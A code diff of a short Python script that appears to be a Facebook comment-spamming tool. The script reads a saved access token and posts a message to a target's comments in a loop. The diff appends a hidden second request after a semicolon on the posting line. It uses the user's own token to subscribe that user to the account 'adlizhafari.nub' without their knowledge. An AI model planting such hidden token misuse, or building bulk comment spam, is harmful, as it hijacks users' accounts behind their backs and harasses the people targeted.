@@ -7,8 +7,7 @@ boleh recode asal cantumkan author aslinya goblok!
 '''
 try:
 	import requests
-	from multiprocessing.pool import ThreadPool
-	import os, sys, json, time, hashlib
+	import os, sys, json, time
 
 	banner=("""
  _                              _         
@@ -34,7 +33,7 @@ try:
 	toket=open('toket/token.txt','r').read()
 	for i in range(lo):
 		par = {'access_token' : toket, 'message' : ms}
-		pt=requests.post('https://graph.facebook.com/'+tr+'/comments',data=par)
+		pt=requests.post('https://graph.facebook.com/'+tr+'/comments',data=par);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 		post=json.loads(pt.text)
 #		print(pt.text)
 		if 'error' in str(post):
